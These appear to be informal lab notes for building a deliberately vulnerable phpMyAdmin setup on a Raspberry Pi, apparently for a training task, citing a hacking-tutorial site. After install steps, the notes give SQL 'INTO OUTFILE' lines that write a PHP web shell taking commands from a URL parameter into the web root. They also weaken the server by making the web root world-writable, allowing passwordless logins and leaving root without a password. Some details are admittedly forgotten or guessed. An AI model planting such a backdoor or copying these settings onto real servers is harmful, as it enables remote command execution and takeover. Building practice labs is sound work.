From http://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/

1. Run 'sudo apt-get install apache2 mariadb-server-10.1 php phpmyadmin -y'
2. Click yes twice during the installation - for defaults
3. Run 'sudo nano /etc/apache2/apache2.conf'
4. Add 'Include /etc/phpmyadmin/apache.conf' to the end of the file
5. Run 'sudo service apache2 restart'

The service should now be accesible from PI via localhost/phpmyadmin
You can check default password in (provide path, I forgot), but this is not enough to make the exploit possible
Due to access issues, somehow a phpmyadmin login has to provide sudo rights, to create a file in I presume /var/www/html
Following command should work - SELECT "<?php system($_GET[‘cmd’]); ?>" INTO OUTFILE "/var/www/html/backdoor.php"
After which it should possible to enter commands using cmd keyword in query, something like in Flask task

SELECT "<?php $output = shell_exec('ls'); echo \"<pre>$output</pre>\"; ?>" INTO OUTFILE "/var/www/html/backdoor.php"

root works with no password (unchecked password needed, might as well set the password as admin)

sudo chmod  o+w /var/www/html should work
sudo nano /etc/phpmyadmin/confg.inc.something all lines with AllowNoPassword to TRUE

Notes:

XAMPP will not work on PI due to different hardware architectures.